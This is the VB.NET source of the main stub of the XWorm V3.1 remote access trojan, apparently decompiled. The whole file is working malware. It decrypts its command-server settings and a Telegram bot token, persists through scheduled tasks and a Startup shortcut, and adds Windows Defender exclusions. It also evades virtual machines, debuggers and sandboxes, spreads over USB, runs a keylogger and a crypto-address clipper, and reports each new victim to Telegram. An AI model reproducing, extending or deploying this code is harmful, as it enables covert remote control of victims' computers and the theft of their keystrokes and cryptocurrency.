Imports System
Imports System.Collections
Imports System.Diagnostics
Imports System.IO
Imports System.Management
Imports System.Net
Imports System.Runtime.CompilerServices
Imports System.Runtime.InteropServices
Imports System.Threading
Imports Microsoft.VisualBasic
Imports Microsoft.VisualBasic.CompilerServices
Imports Microsoft.VisualBasic.Devices
Imports My

Namespace Stub
	' Token: 0x02000008 RID: 8
	Public Class Main
		' Token: 0x06000014 RID: 20 RVA: 0x00002298 File Offset: 0x00000498
		<STAThread()>
		Public Shared Sub Main()
			' The following expression was wrapped in a checked-expression
			Thread.Sleep(Settings.Sleep * 1000)
			Try
				Settings.Host = Conversions.ToString(AlgorithmAES.Decrypt(Settings.Host))
				Settings.Port = Conversions.ToString(AlgorithmAES.Decrypt(Settings.Port))
				Settings.KEY = Conversions.ToString(AlgorithmAES.Decrypt(Settings.KEY))
				Settings.SPL = Conversions.ToString(AlgorithmAES.Decrypt(Settings.SPL))
				Settings.USBNM = Conversions.ToString(AlgorithmAES.Decrypt(Settings.USBNM))
				Settings.InstallDir = Environment.ExpandEnvironmentVariables(Settings.InstallDir)
				Settings.BTC = Conversions.ToString(AlgorithmAES.Decrypt(Settings.BTC))
				Settings.ETH = Conversions.ToString(AlgorithmAES.Decrypt(Settings.ETH))
				Settings.TRC = Conversions.ToString(AlgorithmAES.Decrypt(Settings.TRC))
				Settings.Token = Conversions.ToString(AlgorithmAES.Decrypt(Settings.Token))
				Settings.ChatID = Conversions.ToString(AlgorithmAES.Decrypt(Settings.ChatID))
			Catch ex As Exception
				Environment.[Exit](0)
			End Try
			If Not Helper.CreateMutex() Then
				Environment.[Exit](0)
			End If
			Try
				Stub.Main.RunAntiAnalysis()
			Catch ex2 As Exception
			End Try
			Stub.Main.Exclusion()
			Dim text As String = Settings.InstallDir + "\" + Path.GetFileName(Helper.current)
			Try
				If File.Exists(text) Then
					Dim fileInfo As FileInfo = New FileInfo(text)
					fileInfo.Delete()
				End If
				Thread.Sleep(1000)
				File.WriteAllBytes(text, File.ReadAllBytes(Helper.current))
			Catch ex3 As Exception
			End Try
			Try
				Dim processStartInfo As ProcessStartInfo = New ProcessStartInfo("schtasks.exe")
				processStartInfo.WindowStyle = ProcessWindowStyle.Hidden
				If Conversions.ToBoolean(ClientSocket.UAC()) Then
					processStartInfo.Arguments = String.Concat(New String() { "/create /f /RL HIGHEST /sc minute /mo 1 /tn """, Path.GetFileNameWithoutExtension(Helper.current), """ /tr """, text, """" })
				Else
					processStartInfo.Arguments = String.Concat(New String() { "/create /f /sc minute /mo 1 /tn """, Path.GetFileNameWithoutExtension(Helper.current), """ /tr """, text, """" })
				End If
				Dim process As Process = Process.Start(processStartInfo)
				process.WaitForExit()
			Catch ex4 As Exception
			End Try
			Try
				Dim text2 As String = Settings.InstallDir + "\" + Path.GetFileName(Helper.current)
				Try
					If File.Exists(text2) Then
						Dim fileInfo2 As FileInfo = New FileInfo(text2)
						fileInfo2.Delete()
					End If
					Thread.Sleep(1000)
					File.WriteAllBytes(text2, File.ReadAllBytes(Helper.current))
				Catch ex5 As Exception
				End Try
				Dim text3 As String = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\" + Path.GetFileNameWithoutExtension(Helper.current) + ".lnk"
				Dim instance As Object = Interaction.CreateObject("WScript.Shell", "")
				Dim type As Type = Nothing
				Dim memberName As String = "CreateShortcut"
				Dim array As Object() = New Object() { text3 }
				Dim arguments As Object() = array
				Dim argumentNames As String() = Nothing
				Dim typeArguments As Type() = Nothing
				Dim array2 As Boolean() = New Boolean() { True }
				Dim obj As Object = NewLateBinding.LateGet(instance, type, memberName, arguments, argumentNames, typeArguments, array2)
				If array2(0) Then
					text3 = CStr(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array(0)), GetType(String)))
				End If
				Dim instance2 As Object = obj
				NewLateBinding.LateSetComplex(instance2, Nothing, "TargetPath", New Object() { text2 }, Nothing, Nothing, False, True)
				NewLateBinding.LateSetComplex(instance2, Nothing, "WorkingDirectory", New Object() { "" }, Nothing, Nothing, False, True)
				NewLateBinding.LateCall(instance2, Nothing, "Save", New Object(-1) {}, Nothing, Nothing, Nothing, True)
				Helper.fileStream = New FileStream(text3, FileMode.Open)
			Catch ex6 As Exception
			End Try
			USB.USBStart()
            Helper.PreventSleep()
            Dim thread1 As New Thread(Sub()
                                          XLogger.callk()
                                      End Sub)
            thread1.Start()

            Dim ClipperRun As New Thread(Sub()
                                             Clipper.Run()
                                         End Sub)
            ClipperRun.Start()

            If Conversions.ToBoolean(ClientSocket.UAC()) Then
                ProcessCritical.CriticalProcess_Enable()
            End If

            Stub.Main.SendBot()

            Dim LastActThread As Thread = New Thread(Sub()
                                                         Helper.LastAct()
                                                     End Sub)

            Dim ConnectionThread As Thread = New Thread(Sub()
                                                            While True
                                                                Thread.Sleep(New Random().[Next](3000, 10000))
                                                                If Not ClientSocket.isConnected Then
                                                                    ClientSocket.isDisconnected()
                                                                    ClientSocket.BeginConnect()
                                                                End If
                                                                ClientSocket.allDone.WaitOne()
                                                            End While
                                                        End Sub)

            LastActThread.Start()
            ConnectionThread.Start()
            ConnectionThread.Join()
        End Sub

        ' Token: 0x06000015 RID: 21 RVA: 0x0000276C File Offset: 0x0000096C
        Public Shared Sub SendBot()
            Try
                Try
                    ServicePointManager.Expect100Continue = True
                    ServicePointManager.SecurityProtocol = CType(3072, SecurityProtocolType)
                    ServicePointManager.DefaultConnectionLimit = 9999
                Catch ex As Exception
                End Try
                Using webClient As WebClient = New WebClient()
                    Dim newLine As String = Environment.NewLine
                    Dim text As String = String.Concat(New String() {"☠ [XWorm V3.1]", newLine, newLine, "New Clinet : ", newLine, Helper.ID(), newLine, newLine, "UserName : ", Environment.UserName, newLine, "OSFullName : ", MyProject.Computer.Info.OSFullName})
                    webClient.DownloadString(String.Concat(New String() {"https://api.telegram.org/bot", Settings.Token, "/sendMessage?chat_id=", Settings.ChatID, "&text=", text}))
                End Using
            Catch ex2 As Exception
            End Try
        End Sub

        ' Token: 0x06000016 RID: 22 RVA: 0x000028DC File Offset: 0x00000ADC
        Public Shared Sub Exclusion()
			If Conversions.ToBoolean(ClientSocket.UAC()) Then
				Try
					Dim processStartInfo As ProcessStartInfo = New ProcessStartInfo()
					processStartInfo.FileName = "powershell.exe"
					processStartInfo.WindowStyle = ProcessWindowStyle.Hidden
					processStartInfo.Arguments = "-ExecutionPolicy Bypass Add-MpPreference -ExclusionPath '" + Helper.current + "'"
					Process.Start(processStartInfo).WaitForExit()
					processStartInfo.Arguments = "-ExecutionPolicy Bypass Add-MpPreference -ExclusionProcess '" + Path.GetFileName(Helper.current) + "'"
					Process.Start(processStartInfo).WaitForExit()
					processStartInfo.Arguments = String.Concat(New String() { "-ExecutionPolicy Bypass Add-MpPreference -ExclusionPath '", Settings.InstallDir, "\", Path.GetFileName(Helper.current), "'" })
					Process.Start(processStartInfo).WaitForExit()
				Catch ex As Exception
				End Try
			End If
		End Sub

		' Token: 0x06000017 RID: 23 RVA: 0x000029CC File Offset: 0x00000BCC
		Public Shared Sub RunAntiAnalysis()
			If Not Stub.Main.DetectManufacturer() AndAlso Not Stub.Main.DetectDebugger() Then
				If Not Stub.Main.DetectSandboxie() Then
					If Not Stub.Main.IsXP() Then
						If Not Stub.Main.anyrun() Then
							Return
						End If
					End If
				End If
			End If
			Environment.FailFast(Nothing)
		End Sub

		' Token: 0x06000018 RID: 24 RVA: 0x00002A00 File Offset: 0x00000C00
		Private Shared Function anyrun() As Boolean
			Try
				Dim text As String = New WebClient().DownloadString("http://ip-api.com/line/?fields=hosting")
				Return text.Contains("true")
			Catch ex As Exception
			End Try
			Return False
		End Function

		' Token: 0x06000019 RID: 25 RVA: 0x00002A50 File Offset: 0x00000C50
		Private Shared Function IsXP() As Boolean
			Try
				If New ComputerInfo().OSFullName.ToLower().Contains("xp") Then
					Return True
				End If
			Catch ex As Exception
			End Try
			Return False
		End Function

		' Token: 0x0600001A RID: 26 RVA: 0x00002AA0 File Offset: 0x00000CA0
		Private Shared Function DetectManufacturer() As Boolean
			Try
				Using obj As Object = New ManagementObjectSearcher("Select * from Win32_ComputerSystem")
					Using objectValue As Object = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(obj, Nothing, "Get", New Object(-1) {}, Nothing, Nothing, Nothing))
						Try
							For Each obj2 As Object In CType(objectValue, IEnumerable)
								Dim objectValue2 As Object = RuntimeHelpers.GetObjectValue(obj2)
								Dim text As String = NewLateBinding.LateIndexGet(objectValue2, New Object() { "Manufacturer" }, Nothing).ToString().ToLower()
								If Operators.CompareString(text, "microsoft corporation", False) <> 0 OrElse Not NewLateBinding.LateIndexGet(objectValue2, New Object() { "Model" }, Nothing).ToString().ToUpperInvariant().Contains("VIRTUAL") Then
									If Not text.Contains("vmware") Then
										If Operators.CompareString(NewLateBinding.LateIndexGet(objectValue2, New Object() { "Model" }, Nothing).ToString(), "VirtualBox", False) <> 0 Then
											Continue For
										End If
									End If
								End If
								Return True
							Next
						Finally
							Dim enumerator As IEnumerator
							If TypeOf enumerator Is IDisposable Then
								TryCast(enumerator, IDisposable).Dispose()
							End If
						End Try
					End Using
				End Using
			Catch ex As Exception
			End Try
			Return False
		End Function

		' Token: 0x0600001B RID: 27 RVA: 0x00002C58 File Offset: 0x00000E58
		Private Shared Function DetectDebugger() As Boolean
			Dim flag As Boolean = False
			Dim result As Boolean
			Try
				Stub.Main.CheckRemoteDebuggerPresent(Process.GetCurrentProcess().Handle, flag)
				result = flag
			Catch ex As Exception
				result = flag
			End Try
			Return result
		End Function

		' Token: 0x0600001C RID: 28 RVA: 0x00002CA8 File Offset: 0x00000EA8
		Private Shared Function DetectSandboxie() As Boolean
			Dim result As Boolean
			Try
				If Stub.Main.GetModuleHandle("SbieDll.dll").ToInt32() <> 0 Then
					result = True
				Else
					result = False
				End If
			Catch ex As Exception
				result = False
			End Try
			Return result
		End Function

		' Token: 0x0600001D RID: 29
		Public Declare Function GetModuleHandle Lib "kernel32.dll" (lpModuleName As String) As IntPtr

		' Token: 0x0600001E RID: 30
		Public Declare Function CheckRemoteDebuggerPresent Lib "kernel32.dll" (hProcess As IntPtr, ByRef isDebuggerPresent As Boolean) As Boolean
	End Class
End Namespace
